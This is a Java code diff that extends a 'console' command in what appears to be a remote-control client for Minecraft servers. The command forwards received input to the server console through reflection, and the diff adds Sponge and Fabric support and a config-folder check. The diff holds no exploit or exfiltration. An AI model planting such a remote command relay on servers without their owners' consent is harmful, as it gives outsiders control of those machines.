@@ -3,6 +3,7 @@ package br.com.introcdc.connect.client.commands.info;
  * Written by IntroCDC, Bruno Coêlho at 11/09/2026 - 01:11
  */
 
+import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.client.command.ClientCommand;
 
 public class ClientCommandConsole extends ClientCommand {
@@ -18,7 +19,7 @@ public class ClientCommandConsole extends ClientCommand {
             return;
         }
 
-        if (br.com.introcdc.connect.Connect.FOLDER.equals("plugins/")) {
+        if (Connect.FOLDER.equals("plugins/") || Connect.FOLDER.equals("config/")) {
             try {
                 Class.forName("org.bukkit.Bukkit");
                 Class<?> mainClass = Class.forName("br.com.introcdc.connect.client.server.BukkitMain");
@@ -42,6 +43,24 @@ public class ClientCommandConsole extends ClientCommand {
                 Class<?> mainClass = Class.forName("br.com.introcdc.connect.client.server.VelocityMain");
                 mainClass.getMethod("execute", String.class).invoke(null, input);
                 msg("Comando enviado ao console do Velocity: " + input);
+                return;
+            } catch (Throwable ignored) {
+            }
+
+            try {
+                Class.forName("org.spongepowered.api.Sponge");
+                Class<?> mainClass = Class.forName("br.com.introcdc.connect.client.server.SpongeMain");
+                mainClass.getMethod("execute", String.class).invoke(null, input);
+                msg("Comando enviado ao console do Sponge: " + input);
+                return;
+            } catch (Throwable ignored) {
+            }
+
+            try {
+                Class.forName("net.fabricmc.api.ModInitializer");
+                Class<?> mainClass = Class.forName("br.com.introcdc.connect.client.server.FabricMain");
+                mainClass.getMethod("execute", String.class).invoke(null, input);
+                msg("Comando enviado ao console do Fabric: " + input);
                 return;
             } catch (Throwable ignored) {
             }
